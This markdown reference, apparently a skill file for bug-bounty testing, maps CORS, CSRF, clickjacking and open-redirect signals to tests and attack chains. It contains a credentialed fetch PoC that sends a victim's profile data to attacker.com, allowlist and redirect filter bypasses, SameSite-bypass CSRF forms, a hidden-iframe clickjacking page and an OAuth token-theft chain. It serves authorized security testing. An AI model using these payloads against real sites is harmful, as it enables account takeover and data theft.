# Skill: Client-Side Attacks — Routing Table

> **Category**: vulnerability  
> **Last Updated**: 2026-05-28  
> **Merged From**: cors.md + csrf.md + clickjacking.md + open-redirect.md  
> **Priority**: LOW — only report when chained to ATO, financial impact, or admin access

---

## Honest Assessment

These vulnerabilities are **low-priority for bug bounty** when standing alone.
- CORS misconfig alone = $0
- CSRF on logout = $0
- Clickjacking with no state-changing action = $0
- Open redirect without chain = $200 at best

**Report only when chained to:** Account Takeover, financial manipulation, admin access, or sensitive data exfiltration.

---

## Routing Table: Feature → Test → Chain Potential

### 1. CORS Headers Found (`Access-Control-Allow-Origin`)

| Feature Signal | Specific Test | Chain Potential |
|----------------|---------------|-----------------|
| Origin fully reflected + `Credentials: true` | `curl -H "Origin: https://evil.com" URL -I` | CORS → cred theft → ATO / admin access |
| `Origin: null` reflected + credentials | Sandboxed iframe PoC | Null origin → API data exfiltration |
| `*.target.com` allowlist | Subdomain enum → XSS or takeover | Subdomain XSS → same-site cred theft |
| Missing `Vary: Origin` on CDN | Cache poisoning → global CORS bypass | All users affected |
| `Access-Control-Allow-Origin: *` on public endpoint | No creds, no sensitive data | DO NOT REPORT |
| Origin reflected but no `Credentials: true` | No session cookies sent | DO NOT REPORT |

**PoC (attacker.com):**
```javascript
fetch('https://target.com/api/v1/user/profile', {
    method: 'GET',
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    fetch('https://attacker.com/exfil?data=' + btoa(JSON.stringify(data)));
});
```

**Allowlist bypass payloads:**
```
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://attacker-target.com
null
```

---

### 2. State-Changing Form / Endpoint (CSRF)

| Feature Signal | Specific Test | Chain Potential |
|----------------|---------------|-----------------|
| No CSRF token parameter | Remove token → request succeeds | CSRF → password/email change → ATO |
| Token present but not validated | Replace with random value → succeeds | Token bypass → any state change |
| Token not bound to session | Use UserB token on UserA request | Session-agnostic token = bypass |
| SameSite=Lax + GET state change | `img src=` or `window.location=` | GET-based state change without interaction |
| SameSite=Lax + method override | `_method=DELETE` on GET request | Framework override bypass |
| SameSite=Lax + fresh cookie (<2min) | Open target → POST within 2min | Chrome Lax exemption window |
| JSON endpoint + CORS creds | `fetch()` with `credentials: include` | JSON CSRF → transfer/role change |
| Content-Type switchable (json→form→text/plain) | `enctype="text/plain"` form | Bypass preflight, submit JSON as form |
| Frontend path includes user input | Inject `../../admin/promote` | CSPT2CSRF → admin action with victim cookies |
| OAuth callback lacks `state` | Authorize → capture code → victim URL | OAuth CSRF → account linking hijack |

**SameSite bypass quick reference:**
```html
<!-- Lax + GET state change -->
<img src="https://target.com/account/delete?confirm=yes" style="display:none">

<!-- Lax + method override -->
GET /account/delete?_method=DELETE&confirm=yes

<!-- JSON CSRF via text/plain -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
</form>
```

---

### 3. Iframe-Able Page (Clickjacking)

| Feature Signal | Specific Test | Chain Potential |
|----------------|---------------|-----------------|
| No `X-Frame-Options` + no `frame-ancestors` | Load in iframe → verify | Clickjacking + CSRF token leakage → state change without consent |
| `X-Frame-Options: SAMEORIGIN` | Find same-origin page without XFO → double-frame | Same-origin intermediary bypass |
| `X-Frame-Options: ALLOW-FROM uri` | Test in Chrome/Safari (unsupported) | Effectively frameable in modern browsers |
| Frame-busting JS only | `sandbox="allow-forms allow-scripts"` | Prevent `top.location` navigation |
| CSP `frame-ancestors 'self'` | Same as XFO SAMEORIGIN — find intermediary | Same-origin bypass |
| CSP `frame-ancestors https://*.target.com` | Claim any subdomain | Subdomain takeover → host PoC |
| High-value single-click action | Build decoy UI alignment | Account deletion, email change, payment confirm, OAuth authorize, 2FA disable |

**Basic PoC:**
```html
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; border: none; }
  .decoy { position: absolute; top: 300px; left: 60px; z-index: 1; }
</style>
<div class="decoy"><button>Claim Prize!</button></div>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
```

**High-value targets (prioritize):**
- Account deletion / deactivation
- Email / password change
- Admin: add/remove users, change roles
- Payment confirmation / subscription
- OAuth authorize third-party app
- 2FA disable / backup code reveal
- API key regeneration / revocation
- Webhook configuration

---

### 4. Redirect Parameter (Open Redirect)

| Feature Signal | Specific Test | Chain Potential |
|----------------|---------------|-----------------|
| `?next=`, `?return=`, `?redirect=` params | `?next=https://attacker.com` | Open redirect → OAuth token theft → ATO |
| OAuth `redirect_uri` prefix match | `redirect_uri=https://target.com/callback/../redirect?url=evil.com` | Token/code exfiltration |
| Path-based redirect `/redirect/URL` | `/redirect//attacker.com` | SSRF跳板 → internal access |
| JS `window.location` assignment | `?next=javascript:alert(1)` | DOM-based open redirect → XSS |
| `target="_blank"` without `rel="noopener"` | `window.opener.location = phishing` | Tabnabbing → credential harvest |

**Filter bypass quick reference:**

| Validation | Bypass |
|------------|--------|
| Must start with `/` | `//evil.com` |
| Contains `trusted.com` | `evil.com?trusted.com` / `trusted.com.evil.com` |
| Bans `http://` | `//evil.com` / `https://evil.com` |
| Must start with `https://trusted.com` | `https://trusted.com@evil.com` |
| `endswith('target.com')` | `http://evil.com/www.target.com` |
| Backslash trick | `/\evil.com` → browser normalizes to `//evil.com` |
| URL encoding | `https://trusted.com/%2F%2Fevil.com` |
| Userinfo injection | `//target.com@evil.com` |

**OAuth token theft chain:**
```
1. Open redirect: /redirect?url=https://attacker.com
2. redirect_uri accepted: /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com
3. Victim authorizes → token sent to attacker domain
4. Attacker reads location.hash → ATO
```

**Tabnabbing check:**
```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click</a>
```

---

## Impact Assessment: When to Report

| Vulnerability | Report When | Skip When |
|---------------|-------------|-----------|
| CORS | Can steal creds + access sensitive API | Public endpoint, no credentials, no sensitive data |
| CSRF | Password/email change, privilege escalation, payment, 2FA disable | Logout, read-only, theoretical without PoC |
| Clickjacking | State-changing action with working PoC | Headers missing but no action, login pages, info-only pages |
| Open Redirect | Chained to OAuth ATO, SSRF, or phishing with impact proof | Generic redirect, no chain, no sensitive data |

---

## Cross-Feature Chains

| Chain | Result |
|-------|--------|
| Open Redirect → OAuth → ATO | Token theft via trusted domain redirect |
| Open Redirect → SSRF → Cloud Metadata | Attacker returns 302 → 169.254.169.254 |
| CORS + XSS (subdomain) | Same-site cred theft without phishing |
| CORS + Subdomain Takeover | Control trusted Origin, bypass allowlist |
| CSRF + XSS | Extract token from DOM, submit valid request |
| CSRF + CORS Misconfig | JSON CSRF via fetch with credentials |
| CSRF + Clickjacking | Victim clicks hidden action button |
| Clickjacking + OAuth | Unauthorized app access via framed "Allow" |
| Clickjacking + CSRF Token Leakage | State change without user knowledge |
| Tabnabbing + Open Redirect | Silent page replacement → credential harvest |

---

## Chain Potential

| Combines With | Result |
|---------------|--------|
| `xss.md` | XSS + weak CORS = full API credential theft |
| `auth-attacks.md` | Open redirect → OAuth callback hijack → ATO |
| `xss.md` | Clickjacking + stored XSS = mass admin action injection |

---

## Anti-Patterns

### DO NOT
- Report CORS without data theft proof
- Report CSRF on login/logout or read-only endpoints
- Report clickjacking without a working PoC on a state-changing action
- Report open redirect without a chain to higher impact
- Report "defense in depth" suggestions as vulnerabilities
- Waste effort on theoretical bypasses without working exploitation

### Safety
- Use test accounts for all verification
- Do not modify production data on accounts you don't control
- Do not host PoC pages on publicly discoverable URLs before reporting
- OAuth token theft tests: use your own test account only
